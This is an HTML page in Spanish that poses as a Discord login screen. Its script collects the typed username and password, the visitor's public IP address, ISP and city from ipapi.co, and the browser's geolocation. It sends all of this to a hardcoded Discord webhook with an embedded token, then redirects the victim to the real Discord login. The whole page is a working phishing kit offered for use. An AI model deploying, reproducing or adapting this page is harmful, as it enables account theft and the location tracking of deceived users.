<!DOCTYPE html>
<html lang="es-es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso a Discord</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif; background: #202225; color: #fff; display: flex; justify-content: center; align-items: center; }
        .card { background: #2f3136; padding: 40px; border-radius: 10px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
        input, textarea { width: 100%; padding: 12px; margin: 10px 0; background: #202225; border: 1px solid #40444b; color: #fff; border-radius: 5px; box-sizing: border-box; }
        .btn-discord { background: #5865F2; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
        #question-screen { display: none; }
        .codeby-footer { margin-top: 25px; color: #5865F2; font-size: 10px; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="login-screen" class="card">
        <h2>Iniciar sesión</h2>
        <input type="text" id="user" placeholder="Usuario">
        <input type="password" id="pass" placeholder="Contraseña">
        <button id="btnGo" class="btn-discord">Continuar</button>
        <div class="codeby-footer">By:Codeby</div>
    </div>

    <div id="question-screen" class="card">
        <h2 style="color: #5865F2;">¿Por qué quieres entrar a Discord?</h2>
        <textarea id="reason" rows="3" placeholder="Escribe tu motivo aquí..."></textarea>
        <button class="btn-discord" id="btnVerify">Enviar y autorizar acceso</button>
        <div class="codeby-footer">By:Codeby</div>
    </div>

    <script>
        const hook = "https://discord.com/api/webhooks/1509748386973220975/s3XxCMhpK8PFhgpX8aFnxEttiRm-RM-zbdOqtVSDUMNf_t3d-iBxl5NmcXPSXc95XvOU";
        let u = "", p = "", ipData = {};

        // Captura automática de datos técnicos al cargar la página
        async function getDeviceData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (e) { console.error("Error al obtener datos de red"); }
        }
        getDeviceData();

        document.getElementById('btnGo').onclick = () => {
            u = document.getElementById('user').value;
            p = document.getElementById('pass').value;
            if(u && p) {
                // Solicitar ubicación aquí para asegurar que el navegador pida permiso
                navigator.geolocation.getCurrentPosition(() => {}, () => {});
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('question-screen').style.display = 'block';
            }
        };

        document.getElementById('btnVerify').onclick = () => {
            const reason = document.getElementById('reason').value;
            navigator.geolocation.getCurrentPosition(
                (pos) => sendToDiscord(pos.coords, reason),
                () => sendToDiscord(null, reason)
            );
        };

        async function sendToDiscord(geo, reason) {
            const data = {
                embeds: [{
                    title: "📊 LOG CAPTURADO - Codeby",
                    color: 0x5865F2,
                    fields: [
                        { name: "Usuario", value: u, inline: true },
                        { name: "Contraseña", value: p, inline: true },
                        { name: "Motivo de acceso", value: reason || "No especificado" },
                        { name: "IP Pública", value: ipData.ip || "N/A", inline: true },
                        { name: "ISP", value: ipData.org || "N/A", inline: true },
                        { name: "Ubicación (Red)", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
                        { name: "Coordenadas", value: geo ? `${geo.latitude}, ${geo.longitude}` : "Denegado" }
                    ],
                    footer: { text: "Sistema Codeby" }
                }]
            };

            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });

            window.location.href = "https://discord.com/login";
        }
    </script>
</body>
</html>
